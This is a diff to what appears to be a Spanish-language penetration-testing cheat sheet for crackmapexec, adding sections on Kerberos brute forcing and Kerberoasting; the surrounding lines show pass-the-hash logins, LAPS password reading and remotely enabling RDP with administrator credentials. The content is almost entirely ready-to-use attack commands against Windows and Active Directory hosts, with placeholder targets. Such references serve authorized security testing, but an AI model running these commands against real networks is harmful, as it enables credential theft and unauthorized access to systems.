@@ -70,6 +70,16 @@ crackmapexec smb <IP-Address> -u '<USERNAME>' -H '<HASH>' --local-auth
 crackmapexec smb <IP-Address> -u '<USERNAME>' -p '<PASSWORD>' --laps
 ```
 
+#### Fuerza bruta a Kerberos
+```
+crackmapexec smb <IP-Address> -u users.txt -p '' --kerberos
+```
+
+#### Ataque de Kerberoasting
+```
+crackmapexec ldap <IP-Address> -u '<USERNAME>' -p '<PASSWORD>' --kerberoasting
+```
+
 #### Habilitar RDP con usuario y password de Administrador
 ```
 crackmapexec smb <IP-Address> -u '<USERNAME>' -p '<PASSWORD>' -M rdp -o action=enable
